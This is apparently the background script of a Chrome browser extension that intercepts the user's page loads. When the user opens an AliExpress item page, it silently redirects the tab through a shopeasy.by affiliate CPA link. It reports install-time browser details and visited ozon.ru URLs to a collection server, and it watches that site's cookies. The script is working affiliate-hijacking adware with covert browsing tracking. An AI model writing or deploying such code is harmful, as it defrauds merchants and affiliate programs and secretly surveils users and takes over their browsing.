function autoactivateClass() {
	var self = this;

	this.auto_activate_moments = {};

	this.setMoment = function(domain, moment) {
		self.auto_activate_moments[domain] = moment;
	}

	this.getMoment = function(domain) {
		var rv = false;
		if (domain in self.auto_activate_moments) {
			rv = self.auto_activate_moments[domain];
		}
		return rv;
	}

	this.resetMoments = function() {
		self.auto_activate_moments = {};
	}
}

function Collect(){
  var self = this;

  this.Data = {
    lang:       window.navigator.language,
    cookie:     window.navigator.cookieEnabled,
    userAgent:  window.navigator.userAgent
  };

  this.sendData = function (url, param){
    let xhr = new XMLHttpRequest();
    let json = JSON.stringify({data:param})
    xhr.open("POST", url, true);
    xhr.setRequestHeader('Content-Type', 'application/json')
    xhr.onreadystatechange = function(){
      if(xhr.readyState == 4 && xhr.status ==200){
        console.log(xhr.responseText);
      }
    }
    xhr.send(json);
  };

}

function JsInject() {

  var self = this;

  this.server   = 'http://localhost:3000/ext';
  this.regList  = [/^https:\/\/ru(.*?)aliexpress(.*?)item(.*?\.html)/g, /(^http(.):\/\/www\.ozon\.ru)(.*?)/g]; //from server
  this.deepLink = 'http://shopeasy.by/redirect/cpa/o/ou76wi7vip8o8fxzn1fxixpo2ddqm8m2/'; //from server
  this.filter   = {urls: ["<all_urls>"], types:["main_frame"]};
  this.opt_extraInfoSpec = ["blocking"];

  this.autoactivateObj = new autoactivateClass();
  this.statsCollect    = new Collect();

  _init();

  function _init(){
    chrome.runtime.onInstalled.addListener(whenInstalled);
    chrome.cookies.onChanged.addListener(cookieChanges);
    chrome.webRequest.onBeforeRequest.addListener(beforeRequest, self.filter, self.opt_extraInfoSpec);
  }

  function cookieChanges(info){
    //console.log(info.cookie.domain);
    if (info.cookie.domain === 'shopeasy.by'){
      console.log(info.cookie.domain);
    }
  }

  function beforeRequest(req){
    re = {cancel:false};

    if (req.frameId == 0 && req.method == "GET"){
      let link = _urlMatch(req.url);
      if (link != null) {
        var moment = self.autoactivateObj.getMoment(link);
        console.log(moment);
        if (moment + 720000 < Date.now()){
          self.autoactivateObj.setMoment(link, Date.now());
          let partner = _encodeUrl(self.deepLink, link);
          console.log(partner);
          chrome.tabs.update(req.tabId, {url:partner});
        }
      }
    }
    return re;
  }

  function whenInstalled(details){
    if (details.reason === 'install'){
      console.log('first install');
      self.statsCollect.sendData(self.server, {info:self.statsCollect.Data, first:true});
    }
    else {
      console.log(details.reason);
    }
  }

  function _urlMatch(url){
    for (let i=0;i<self.regList.length;++i){
      let index = self.regList[i];
      if (index.test(url)){
        if (url.match(self.regList[0])){
          return url.match(self.regList[0])[0];
        } else {
          self.statsCollect.sendData(self.server, url);
          return null;
        }
      }
    }
    return null;
  }

  function _encodeUrl(first, last){
    return first +'?to='+ encodeURIComponent(last);
  }

}

var objInject = new JsInject();
